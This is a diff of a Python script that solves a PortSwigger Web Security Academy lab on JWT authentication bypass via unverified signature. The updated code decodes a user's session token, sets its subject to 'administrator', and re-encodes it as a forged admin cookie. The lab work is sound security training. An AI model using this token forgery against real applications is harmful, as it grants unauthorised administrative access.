@@ -1,10 +1,17 @@
 import requests
 import argparse
 import re
+from base64 import b64encode, b64decode
+import json
 
 parser = argparse.ArgumentParser(description='Solves the following Lab: JWT authentication bypass via unverified signature')
 parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
 lab = parser.parse_args()
+
+def add_padding(b64str):
+    while len(b64str) % 4 != 0:
+        b64str += '='
+    return b64str
 
 # GET CSRF AND COOKIE
 r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
@@ -17,7 +24,11 @@ wiener = r.cookies.get('session')
 
 # FORGE ADMINISTRATOR COOKIE
 jwt = wiener.split('.')
-jwt[1] = "eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTY5NDQxMjF9" # {"iss":"portswigger","sub":"administrator","exp":1696944121}
+jwt[1] = b64decode(add_padding(jwt[1])).decode("utf-8")
+jwt[1] = json.loads(jwt[1])
+jwt[1]["sub"] = "administrator"
+jwt[1] = b64encode(json.dumps(jwt[1]).encode()).decode().strip('=')
+
 administrator = f"{jwt[0]}.{jwt[1]}.{jwt[2]}"
 headers = {"Cookie":f"session={administrator}"}
 
